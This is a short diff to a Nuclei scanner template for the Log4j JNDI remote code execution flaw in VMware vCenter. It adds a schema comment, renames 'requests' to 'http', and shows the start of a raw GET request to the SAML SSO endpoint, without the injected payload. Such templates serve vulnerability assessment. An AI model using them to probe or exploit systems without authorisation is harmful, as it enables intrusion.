@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: vmware-vcenter-log4j-jndi-rce
 
 info:
@@ -11,7 +12,7 @@ info:
     - https://twitter.com/tnpitsecurity/status/1469429810216771589
   tags: rce,jndi,log4j,vcenter,vmware
 
-requests:
+http:
   - raw:
       - |
         GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
